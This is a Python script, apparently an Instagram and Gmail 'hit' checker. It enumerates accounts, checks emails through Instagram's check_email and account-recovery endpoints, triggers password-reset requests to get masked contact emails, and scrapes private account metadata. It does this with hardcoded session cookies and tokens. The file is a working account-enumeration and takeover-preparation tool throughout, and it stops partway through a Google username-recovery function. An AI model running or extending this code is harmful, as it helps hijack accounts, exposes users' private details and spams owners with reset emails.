#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import random
import string
import json
import uuid
import base64
import hashlib
import threading
import requests
import urllib.parse
import secrets
import httpx
from bs4 import BeautifulSoup
from threading import Thread, Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
from colorama import Fore, Style, init
from datetime import datetime
from random import choice, randrange

init(autoreset=True)

R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE
M = Fore.MAGENTA
RESET_COL = Style.RESET_ALL
B = Style.BRIGHT

hits = 0
bad_insta = 0
bad_email = 0
good_insta = 0
total = 0
follower_0_50 = 0
follower_50_250 = 0
follower_250_plus = 0
min_followers = 0
limit = 0
taken = 0
email = ""
hit_lock = Lock()

_about_session_index = 0
_about_session_lock = Lock()

ABOUT_SESSION_ID = ""
ABOUT_CSRF_TOKEN = ""
ABOUT_DS_USER_ID = ""
ABOUT_COOKIE_STR = ""

session = requests.Session()
_session = requests.Session()

ID_RANGES = [
    (279760001, 900990000, 2013),
    (900990001, 1629010000, 2014),
    (1629010001, 2369359761, 2015),
    (2369359762, 4239516754, 2016),
    (4239516755, 6345108209, 2017),
    (6345108210, 10016232395, 2018),
    (10016232396, 27238602159, 2019),
    (27238602160, 46464475395, 2020),
    (46464475395, 50289297647, 2021),
    (50289297647, 57464707082, 2022),
    (57464707082, 63313426938, 2023),
    (63313426938, 70134323896, 2024),
    (70313426938, 78313496938, 2025)
]

# Your fresh cookies
HARDCODED_SESSIONS = [
{
    "csrftoken": "tS0085SF9mS3f9B-HsFwWA",
    "mid": "aicb9QAEAAFvqtc1fk9HpCs9etH8",
    "ig_did": "DED92EB9-D166-42D6-8AA7-E9FA0650F6F0",
    "sessionid": "16082790957%3A8BRxX3m6fQDdkN%3A27%3AAYg-kfF3iXVPu_I-jgB8S9U_x10MmZ3ghobS2flUuA",
    "ds_user_id": "16082790957"
}
]

max_CONFIG = {
    "max_date_filter": False,
    "max_follower_filter": False,
    "max_min_followers": 50,          # Minimum followers = 50
    "max_about_info": True,
    "max_country": False
}

CONFIG = {
    "insta_graphql": "https://www.instagram.com/api/graphql",
    "google_url": "https://accounts.google.com",
    "form_type": "application/x-www-form-urlencoded; charset=UTF-8",
    "token_file": "tokens.txt",
    "output_file": "@max_hits.txt",
    "domain": "@gmail.com",
    "channel": "https://t.me/stuff_portal",
    "me": "https://t.me/stuff_portal",
}

def get_country_flag(country_name: str) -> str:
    if not country_name or country_name in ["-", "Paylasilmadi", "None", ""]:
        return ""
    flags = {
    "Türkiye": "🇹🇷", "Irak": "🇮🇶", "Fransa": "🇫🇷", "Endonezya": "🇮🇩",
    "Arjantin": "🇦🇷", "Almanya": "🇩🇪", "Amerika Birleşik Devletleri": "🇺🇸",
    "Birleşik Krallık": "🇬🇧", "İngiltere": "🇬🇧", "İtalya": "🇮🇹",
    "İspanya": "🇪🇸", "Hollanda": "🇳🇱", "Belçika": "🇧🇪", "İsviçre": "🇨🇭",
    "Avusturya": "🇦🇹", "İsveç": "🇸🇪", "Norveç": "🇳🇴", "Danimarka": "🇩🇰",
    "Finlandiya": "🇫🇮", "Polonya": "🇵🇱", "Rusya": "🇷🇺", "Ukrayna": "🇺🇦",
    "Brezilya": "🇧🇷", "Meksika": "🇲🇽", "Hindistan": "🇮🇳", "Japonya": "🇯🇵",
    "Güney Kore": "🇰🇷", "Avustralya": "🇦🇺", "Kanada": "🇨🇦", "Mısır": "🇪🇬",
    "Suudi Arabistan": "🇸🇦", "Birleşik Arap Emirlikleri": "🇦🇪", "Katar": "🇶🇦",
    "Kuveyt": "🇰🇼", "İran": "🇮🇷", "Yunanistan": "🇬🇷", "Portekiz": "🇵🇹",
    "Romanya": "🇷🇴", "Bulgaristan": "🇧🇬", "Macaristan": "🇭🇺", "Çekya": "🇨🇿",
    "Hırvatistan": "🇭🇷", "Sırbistan": "🇷🇸", "Arnavutluk": "🇦🇱", "Kosova": "🇽🇰",
    "Malezya": "🇲🇾", "Singapur": "🇸🇬", "Tayland": "🇹🇭", "Vietnam": "🇻🇳",
    "Filipinler": "🇵🇭", "Çin": "🇨🇳", "Hong Kong": "🇭🇰", "Tayvan": "🇹🇼",
    "Gürcistan": "🇬🇪", "Azerbaycan": "🇦🇿", "Kazakistan": "🇰🇿", "Özbekistan": "🇺🇿",
    "Pakistan": "🇵🇰", "Bangladeş": "🇧🇩", "Kolombiya": "🇨🇴", "Şili": "🇨🇱",
    "Peru": "🇵🇪", "Venezuela": "🇻🇪", "Güney Afrika": "🇿🇦", "Nijerya": "🇳🇬",
    "Kenya": "🇰🇪", "Fas": "🇲🇦", "Tunus": "🇹🇳", "Cezayir": "🇩🇿",
    "Libya": "🇱🇾", "Sudan": "🇸🇩", "Etiyopya": "🇪🇹", "Gana": "🇬🇭",
    "Tanzanya": "🇹🇿", "Uganda": "🇺🇬", "Kamerun": "🇨🇲", "Fildişi Sahili": "🇨🇮",
    "Senegal": "🇸🇳", "Ürdün": "🇯🇴", "Lübnan": "🇱🇧", "Suriye": "🇸🇾",
    "Yemen": "🇾🇪", "Umman": "🇴🇲", "Bahreyn": "🇧🇭", "İsrail": "🇮🇱",
    "Filistin": "🇵🇸", "Afganistan": "🇦🇫", "Sri Lanka": "🇱🇰", "Nepal": "🇳🇵",
    "Myanmar": "🇲🇲", "Kamboçya": "🇰🇭", "Moğolistan": "🇲🇳", "Kırgızistan": "🇰🇬",
    "Tacikistan": "🇹🇯", "Türkmenistan": "🇹🇲", "Yeni Zelanda": "🇳🇿",
    "İrlanda": "🇮🇪", "Slovakya": "🇸🇰", "Slovenya": "🇸🇮",
    "Bosna Hersek": "🇧🇦", "Karadağ": "🇲🇪", "Kuzey Makedonya": "🇲🇰",
    "Moldova": "🇲🇩", "Belarus": "🇧🇾", "Litvanya": "🇱🇹", "Letonya": "🇱🇻",
    "Estonya": "🇪🇪", "Lüksemburg": "🇱🇺", "Malta": "🇲🇹", "Kıbrıs": "🇨🇾",
    "İzlanda": "🇮🇸", "Ermenistan": "🇦🇲", "Ekvador": "🇪🇨", "Bolivya": "🇧🇴",
    "Paraguay": "🇵🇾", "Uruguay": "🇺🇾", "Küba": "🇨🇺", "Dominik Cumhuriyeti": "🇩🇴",
    "Haiti": "🇭🇹", "Porto Riko": "🇵🇷", "Guatemala": "🇬🇹", "Honduras": "🇭🇳",
    "El Salvador": "🇸🇻", "Nikaragua": "🇳🇮", "Kosta Rika": "🇨🇷", "Panama": "🇵🇦",
    "Trinidad ve Tobago": "🇹🇹", "Jamaika": "🇯🇲",
}
    if country_name in flags:
        return flags[country_name]
    country_lower = country_name.lower()
    for key in flags:
        if key.lower() in country_lower or country_lower in key.lower():
            return flags[key]
    return ""

def r(n):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def gdate(user_id):
    try:
        user_id = int(user_id)
        for lower, upper, year in ID_RANGES:
            if lower <= user_id <= upper:
                return year
        return 2025
    except Exception:
        return 2025

def get_random_year_range():
    return random.choice(ID_RANGES)

def _build_cookie_str(s):
    return (
        f"csrftoken={s['csrftoken']}; "
        f"ig_did={s['ig_did']}; "
        f"mid={s['mid']}; "
        f"ds_user_id={s['ds_user_id']}; "
        f"sessionid={s['sessionid']}"
    )

def _next_about_session():
    global _about_session_index, ABOUT_SESSION_ID, ABOUT_CSRF_TOKEN, ABOUT_DS_USER_ID, ABOUT_COOKIE_STR
    with _about_session_lock:
        s = HARDCODED_SESSIONS[_about_session_index % len(HARDCODED_SESSIONS)]
        _about_session_index += 1
    ABOUT_SESSION_ID = s["sessionid"]
    ABOUT_CSRF_TOKEN = s["csrftoken"]
    ABOUT_DS_USER_ID = s["ds_user_id"]
    ABOUT_COOKIE_STR = _build_cookie_str(s)
    return s

def _random_about_session():
    s = random.choice(HARDCODED_SESSIONS)
    cookie_str = _build_cookie_str(s)
    return s["sessionid"], s["csrftoken"], s["ds_user_id"], cookie_str

ABOUT_WEB_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 OPR/128.0.0.0"
about_tokens = {"fb_dtsg": None, "lsd": None, "rev": "1035271382", "bkv": "61fc9465e13b77eaa110f317859102ba7fb93a0a2bcc08c46473da6713640739"}
about_token_lock = Lock()

def about_refresh_tokens(cookie_str=None, username="instagram"):
    global about_tokens
    global ABOUT_SESSION_ID, ABOUT_COOKIE_STR
    if not ABOUT_SESSION_ID:
        return False
    _cookie = cookie_str or ABOUT_COOKIE_STR
    try:
        resp = requests.get(
            f"https://www.instagram.com/{username}/",
            headers={
                "User-Agent": ABOUT_WEB_UA,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
                "Accept-Encoding": "gzip, deflate",
                "Cookie": _cookie,
                "Referer": "https://www.instagram.com/",
            }
        )
        html = resp.text
        m  = re.search(r'"f":"([^"]+)"', html)
        m2 = re.search(r'"LSD"[^}]*"token":"([^"]+)"', html)
        m3 = re.search(r'"server_revision":(\d+)', html)
        m4 = re.search(r'__bkv=([a-f0-9]{40,})', html)
        m5 = re.search(r'"hsi":"([^"]+)"', html)
        dyn_m = re.search(r'"__dyn":"([^"]+)"', html)
        csr_m = re.search(r'"__csr":"([^"]+)"', html)
        with about_token_lock:
            if m:     about_tokens["fb_dtsg"] = m.group(1)
            if m2:    about_tokens["lsd"]     = m2.group(1)
            if m3:    about_tokens["rev"]     = m3.group(1)
            if m4:    about_tokens["bkv"]     = m4.group(1)
            if m5:    about_tokens["hsi"]     = m5.group(1)
            if dyn_m: about_tokens["dyn"]     = dyn_m.group(1)
            if csr_m: about_tokens["csr"]     = csr_m.group(1)
        return about_tokens["fb_dtsg"] is not None
    except Exception:
        return False

def about_token_refresher():
    while True:
        try:
            if not about_tokens.get("fb_dtsg"):
                _next_about_session()
                about_refresh_tokens(ABOUT_COOKIE_STR)
            else:
                about_refresh_tokens(ABOUT_COOKIE_STR)
        except:
            pass
        time.sleep(60)

def get_about_account(user_id, username):
    if not about_tokens.get("fb_dtsg"):
        about_refresh_tokens(ABOUT_COOKIE_STR, username)
    result = _try_get_about(user_id, username)
    if result.get("join_date") or result.get("country") or result.get("former_usernames"):
        return result
    try:
        _next_about_session()
        about_refresh_tokens(ABOUT_COOKIE_STR, username)
        result2 = _try_get_about(user_id, username)
        return result2
    except:
        pass
    return result

def _try_get_about(user_id, username):
    try:
        _sid, _csrf, _dsid, _cookie = _random_about_session()
        with about_token_lock:
            fb_dtsg = about_tokens.get("fb_dtsg")
            lsd     = about_tokens.get("lsd") or ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            rev     = about_tokens.get("rev", "1035271382")
            bkv     = about_tokens.get("bkv", "61fc9465e13b77eaa110f317859102ba7fb93a0a2bcc08c46473da6713640739")
        if not fb_dtsg:
            return {"join_date": None, "country": None, "former_usernames": []}
        hsi     = about_tokens.get("hsi", "7618017801523903853")
        dyn     = about_tokens.get("dyn", "7xeUjG1mxu1syUbFp41twpUnwgU7SbzEdF8aUco2qwJxS0DU2wx609vCwjE1EE2Cw8G11wBz81s8hwGxu786a3a1YwBgao6C0Mo2")
        csr     = about_tokens.get("csr", "")
        jazoest = '2' + str(sum(ord(c) for c in fb_dtsg))
        spin_t  = str(int(time.time()))
        post_params = {
            "__d": "www", "__user": "0", "__a": "1", "__req": "15",
            "__hs": "20529.HYP:instagram_web_pkg.2.1...0", "dpr": "1",
            "__ccg": "EXCELLENT", "__rev": rev, "__hsi": hsi,
            "__dyn": dyn, "__csr": csr, "__comet_req": "7",
            "__crn": "comet.igweb.PolarisProfilePostsTabRoute",
            "fb_dtsg": fb_dtsg, "jazoest": jazoest, "lsd": lsd,
            "__spin_r": rev, "__spin_b": "trunk", "__spin_t": spin_t,
            "params": json.dumps({"referer_type": "ProfileMore", "target_user_id": str(user_id)}),
        }
        url = f"https://www.instagram.com/async/wbloks/fetch/?appid=com.bloks.www.ig.about_this_account&type=app&__bkv={bkv}"
        resp = requests.post(url, headers={
            "User-Agent": ABOUT_WEB_UA,
            "Accept": "*/*",
            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "Origin": "https://www.instagram.com",
            "Referer": f"https://www.instagram.com/{username}/",
            "Cookie": _cookie,
            "X-CSRFToken": _csrf,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }, data=urllib.parse.urlencode(post_params))
        raw = resp.text
        if raw.startswith("for (;;);"):
            raw = raw[9:]
        parsed = json.loads(raw)
        if parsed.get("error") or parsed.get("status") == "fail":
            with about_token_lock:
                about_tokens["fb_dtsg"] = None
            return {"join_date": None, "country": None, "former_usernames": []}
        result = {"join_date": None, "country": None, "former_usernames": []}
        text_str = json.dumps(parsed, ensure_ascii=False)
        for pat in [r'Katilma tarihi ([A-Za-z\u00c7\u00e7\u011e\u011f\u0130\u0131\u00d6\u00f6\u015e\u015f\u00dc\u00fc]+ \d{4})',
                    r'Date joined ([A-Za-z]+ \d{4})']:
            m = re.search(pat, text_str)
            if m:
                result["join_date"] = m.group(1)
                break
        try:
            data_arr = parsed.get("payload", {}).get("layout", {}).get("bloks_payload", {}).get("data", [])
            for item in data_arr:
                if isinstance(item, dict):
                    d = item.get("data", {})
                    key = d.get("key", "")
                    if "about_this_account_country" in key and "visibility" not in key:
                        result["country"] = d.get("initial", "Paylasilmadi")
                        break
        except:
            pass
        former = re.findall(r'nceki kullan[^"]*"([a-zA-Z0-9._]{2,30})"', text_str)
        if former:
            result["former_usernames"] = list(set(former))
        return result
    except Exception:
        return {"join_date": None, "country": None, "former_usernames": []}

USER_AGENTS = [
    "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
    "Instagram 319.0.0.30.121 Android (31/12; 440dpi; 1080x2400; xiaomi; M2101K6G; sweet; qcom; en_GB; 454782345)",
    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1240x2772; OnePlus; CPH2449; ONEPLUS11; qcom; en_US; 489234551)",
    "Instagram 322.0.0.45.112 Android (34/14; 420dpi; 1080x2400; google; Pixel 7; panther; gs201; en_US; 493245782)",
    "Instagram 318.0.0.22.110 Android (29/10; 400dpi; 1080x2310; HUAWEI; ELE-L29; hwELE; kirin980; en_GB; 439875334)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2400; vivo; V2145; PD2145; mt6893; en_US; 478932112)",
    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; samsung; SM-S911B; dm1q; qcom; en_US; 475223914)",
    "Instagram 321.0.0.28.120 Android (33/13; 440dpi; 1080x2400; xiaomi; 2211133G; ruby; mt6983; en_US; 467882419)",
    "Instagram 319.0.0.30.121 Android (32/12; 480dpi; 1080x2412; OnePlus; CPH2413; NE2213; qcom; en_GB; 453228190)",
    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2400; realme; RMX3311; serpent; qcom; en_US; 442119875)",
    "Instagram 320.0.0.34.109 Android (33/13; 440dpi; 1080x2340; samsung; SM-M526BR; m52x; qcom; en_US; 483662991)",
    "Instagram 322.0.0.45.112 Android (34/14; 400dpi; 1080x2400; sony; XQ-CT72; pdx234; qcom; en_US; 498722341)",
    "Instagram 319.0.0.30.121 Android (31/12; 420dpi; 1080x2400; oppo; CPH2457; PHB110; mt6895; en_US; 462775910)",
    "Instagram 321.0.0.28.120 Android (33/13; 480dpi; 1080x2340; samsung; SM-A346B; a34x; mt6877; en_GB; 479201567)",
    "Instagram 322.0.0.45.112 Android (34/14; 440dpi; 1080x2400; motorola; XT2303-2; crosby; qcom; en_US; 492874115)",
    "Instagram 318.0.0.22.110 Android (30/11; 420dpi; 1080x2376; honor; FNE-NX9; fne; kirin9000; en_GB; 431597221)",
    "Instagram 320.0.0.34.109 Android (33/13; 400dpi; 1080x2400; xiaomi; 2201117TY; veux; qcom; en_US; 487266531)",
    "Instagram 319.0.0.30.121 Android (32/12; 440dpi; 1080x2340; samsung; SM-M336B; m33x; exynos1280; en_US; 471823650)",
    "Instagram 321.0.0.28.120 Android (33/13; 420dpi; 1080x2400; realme; RMX3710; halo; mt6833; en_GB; 469862234)",
    "Instagram 322.0.0.45.112 Android (34/14; 480dpi; 1440x3120; lg; LM-V600; judyln; qcom; en_US; 499178234)",
    "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
    "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
]

_CHECK_EMAIL_UA = "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)"
_CHECK_EMAIL_URL = "https://i.instagram.com/api/v1/users/check_email/"

def rest_web_check_email(email):
    try:
        with httpx.Client(http2=True, timeout=6) as client:
            response = client.post(
                _CHECK_EMAIL_URL,
                data={"email": email},
                headers={
                    "User-Agent": _CHECK_EMAIL_UA,
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                }
            )
            data = response.json()
            return data.get("allow_shared_email_registration") is True
    except:
        return False

def rest_bloks_v2(email):
    global limit
    url = "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
    device = str(uuid.uuid4())
    family = str(uuid.uuid4())
    android = "android-" + secrets.token_hex(8)
    payload = {
        'params': "{\"client_input_params\":{\"aac\":\"{\\\"aac_init_timestamp\\\":"+ str(int(time.time())) +",\\\"aacjid\\\":\\\""+ str(uuid.uuid4()) +"\\\",\\\"aaccs\\\":\\\""+ secrets.token_urlsafe(32) +"\\\"}\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"PERMANENTLY_DENIED\",\"READ_CALL_LOG\":\"DENIED\",\"ANSWER_PHONE_CALLS\":\"DENIED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{},\"search_query\":\""+ email +"\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"akyuf0:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\""+ device +"\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":null,\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[]},\"server_params\":{\"event_request_id\":\""+ str(uuid.uuid4()) +"\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\""+ android +"\",\"login_surface\":\"login_home\",\"waterfall_id\":\""+ str(uuid.uuid4()) +"\",\"INTERNAL__latency_qpl_instance_id\":6.3987980400102E13,\"is_platform_login\":0,\"context_data\":\"\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\""+ family +"\",\"offline_experiment_group\":\"caa_iteration_v3_perf_ig_4\",\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\""+ device +"\"}}",
        'bk_client_context': "{\"bloks_version\":\"5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b\",\"styles_id\":\"instagram\"}",
        'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
    }
    headers = {
        'User-Agent': "Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)",
        'accept-language': "en-IN, en-US",
        'x-bloks-version-id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
        'x-ig-android-id': android,
        'x-ig-app-id': "567067343352427",
        'x-ig-app-locale': "en_IN",
        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
        'x-ig-device-id': device,
        'x-ig-family-device-id': family,
        'x-ig-timezone-offset': str(datetime.now().astimezone().utcoffset().total_seconds()),
        'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
        'x-pigeon-rawclienttime': str(time.time()),
        'x-pigeon-session-id': f"UFS-{uuid.uuid4()}-0",
    }
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=20)
        if f"{email}" in response.text:
            return email
        elif 'SOMETHING, GOT F3CKED' in response.text:
            limit += 1
            return None
        else:
            return None
    except Exception:
        return None

def rest_bloks(email):
    try:
        result = rest_bloks_v2(email)
        if result:
            return result
    except:
        pass
    try:
        headers = {
            "User-Agent": "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-bloks-version-id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb",
            "x-ig-app-id": "567067343352427",
        }
        data = {
            "search_query": email,
            "bloks_versioning_id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb"
        }
        with httpx.Client(http2=True) as client:
            r = client.post(
                "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/",
                data=data, headers=headers
            )
        if f"We sent a link to {email}. Use that link to confirm your account." in r.text:
            return email
        return None
    except Exception:
        return None

def lookup_instagram(email):
    if rest_web_check_email(email):
        return True
    try:
        if rest_bloks(email):
            return True
    except:
        pass
    return False

_BASE_URL      = "https://www.instagram.com"
_RESET_URL     = "https://www.instagram.com/accounts/password/reset/"
_SEND_AJAX_URL = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
_UA_WEB        = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36")
_UA_APP        = ("Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; "
                  "samsung; SM-A546B; a54x; exynos1380; tr_TR; 465123678)")

def rest_v1(username):
    max_retries = 2
    for attempt in range(max_retries):
        try:
            client = httpx.Client(http2=True, follow_redirects=True)
            try:
                r0 = client.get(_BASE_URL, headers={
                    "User-Agent": _UA_WEB,
                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
                    "Accept-Language": "tr-TR,tr;q=0.9",
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "none",
                })
            except Exception:
                client.close()
                if attempt < max_retries - 1:
                    continue
                return "-"
            csrf = ""
            for c in client.cookies.jar:
                if c.name == "csrftoken":
                    csrf = c.value
                    break
            if not csrf:
                client.close()
                if attempt < max_retries - 1:
                    continue
                return "-"
            headers = {
                "User-Agent"       : _UA_APP,
                "Accept"           : "*/*",
                "Accept-Language"  : "tr-TR,tr;q=0.9",
                "Accept-Encoding"  : "gzip, deflate, br",
                "Content-Type"     : "application/x-www-form-urlencoded",
                "Origin"           : _BASE_URL,
                "Referer"          : _RESET_URL,
                "X-CSRFToken"      : csrf,
                "X-IG-App-ID"      : "936619743392459",
                "X-Requested-With" : "XMLHttpRequest",
                "X-Instagram-AJAX" : "1",
                "X-ASBD-ID"        : "129477",
                "sec-fetch-dest"   : "empty",
                "sec-fetch-mode"   : "cors",
                "sec-fetch-site"   : "same-origin",
            }
            data = urllib.parse.urlencode({"email_or_username": username})
            r = client.post(_SEND_AJAX_URL, content=data.encode(), headers=headers)
            client.close()
            result = r.json()
            status = result.get("status", "")
            if status == "ok":
                for key in ("obfuscated_email", "contact_point", "masked_email", "email"):
                    val = result.get(key)
                    if val:
                        return val
                return "-"
            elif status == "fail":
                return "Fail: " + result.get("message", "")
            if attempt < max_retries - 1:
                continue
            return "-"
        except Exception:
            if attempt < max_retries - 1:
                continue
            return "-"
    return "-"

def get_masked(query):
    url = "https://www.instagram.com/api/graphql"
    payload = {
        'av': "0",
        '__d': "www",
        '__user': "0",
        '__a': "1",
        '__req': "f",
        '__hs': "20563.HYP:instagram_web_pkg.2.1...0",
        'dpr': "3",
        '__ccg': "GOOD",
        '__rev': "1037676804",
        '__s': "nz2w5z:1vm2xs:94sap8",
        '__hsi': "7630740602831122681",
        '__dyn': "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awt81s8hwnU6a3a1YwBgao6C0Mo2swlo5q4U2zxe2GewGw9a361qw8Xwn8e87q0oa2-azo7u3u2C2O0Lo6-3u2WE5B0bK1Iwqo5p0qZ6goK10xKi2K7E5y2-1mwa6byohw5ywuU1FU",
        '__csr': "hcfEI9NcRh48hnvNdsyaD6RnvOldSySDHBpKBLAF6ypAEzC4-ILahjF6S_ui-np4bmqhfR8gCaWFOmjgyiLt9EJ8FeiiGjFeaUO5XyjkBKUhByUGuhddpufW8yZeXx6aCxVxSaz8ycFbxVacxDCx2q8wwG8wHypp9UOawPADz8yaAgO9yVHwiqz89EhwCw05Cuw2eE1ooCU0gByU6IE1gUqU1ao0Vdw2tFnw1ud06Ca0M8fEx2UN7y4bEM3wo1JU2RwSyaOcayU6d7gy0A-9wi6320Ho0N60W8S02VS09vw0lWo",
        '__hsdp': "gSw8N0I1apBoBrysxGCA9cxkImy-u547Fu1lg13o6u8xy458eQ2Smm50y4FEC2Gce4mE64M09g80n9w6QG09SwjE0iCw5Nw",
        '__hblp': "05twAU5q0gum1MwuU24xS6FU98Sq0E8e88Uowda0Ek0S9U1hE0igwmuq6rwa608Gw4BwaK0BUhw9SfwXUcE34w2iE4W09iweK2O0jG1rx-8wZwaW0iq3u",
        '__sjsp': "gSw8N0I1apBoBrysxGCA8yElaxibVUkg9e0mi1Dy8ox1i3J0JBBxg8xaq9wTe",
        '__comet_req': "7",
        'lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
        'jazoest': "22394",
        '__spin_r': "1037676804",
        '__spin_b': "trunk",
        '__spin_t': "1776670246",
        '__crn': "comet.igweb.PolarisCAAIGAccountRecoverySearchRoute",
        'qpl_active_flow_ids': "516759801",
        'fb_api_caller_class': "RelayModern",
        'fb_api_req_friendly_name': "CAAIGAccountSearchViewQuery",
        'server_timestamps': "true",
        'variables': "{\"params\":{\"event_request_id\":\"7ca5daae-5770-42dd-b77b-0cf23a865a7f\",\"next_uri\":\"\",\"search_query\":\""+ query +"\",\"waterfall_id\":\"553aadae-3ec5-4031-8395-efbabcc670ce\"}}",
        'doc_id': "26178667145161478",
        'fb_api_analytics_tags': "[\"qpl_active_flow_ids=516759801\"]"
    }
    headers = {
        'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
        'sec-ch-ua-model': "\"\"",
        'x-ig-app-id': "936619743392459",
        'x-ig-max-touch-points': "5",
        'sec-ch-ua-mobile': "?0",
        'x-fb-friendly-name': "CAAIGAccountSearchViewQuery",
        'x-fb-lsd': "AdRhedp9xNI2uNuFwNJXmbUAOw8",
        'sec-ch-ua-platform-version': "\"\"",
        'x-asbd-id': "359341",
        'sec-ch-ua-full-version-list': "\"Chromium\";v=\"139.0.7339.0\", \"Not;A=Brand\";v=\"99.0.0.0\"",
        'sec-ch-prefers-color-scheme': "dark",
        'x-csrftoken': "o_6jxh33ZvsQ2eFMyRaM_q",
        'sec-ch-ua-platform': "\"Linux\"",
        'origin': "https://www.instagram.com",
        'sec-fetch-site': "same-origin",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://www.instagram.com/accounts/password/reset/",
        'accept-language': "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        'Cookie': "csrftoken=o_6jxh33ZvsQ2eFMyRaM_q; datr=YMnlaTJAraHY5ADdYH8UqsTG; ig_did=2046A480-DF50-4660-A5CD-DC58F57C7A1C; mid=aeXJYAABAAGoDWzGwrGALDqzE3Np; dpr=3.558248996734619; wd=774x749"
    }
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=20)
        email = next((i["contact_point"] for i in response.json()["data"]["caa_ar_ig_account_search"]["contact_points"] if i["type"] == "EMAIL"), None)
        return email
    except:
        return None

def gtokens():
    max_retries = 2
    endpoint = "/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
    for attempt in range(max_retries + 1):
        try:
            ingilizalfabesiamk = 'abcdefghijklmnopqrstuvwxyz'
            n1 = ''.join(choice(ingilizalfabesiamk) for _ in range(randrange(6, 9)))
            n2 = ''.join(choice(ingilizalfabesiamk) for _ in range(randrange(3, 9)))
            host = ''.join(choice(ingilizalfabesiamk) for _ in range(randrange(15, 30)))
            headers = {
                'accept': '*/*',
                'accept-language': 'en-GB,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'user-agent': random.choice(USER_AGENTS)
            }
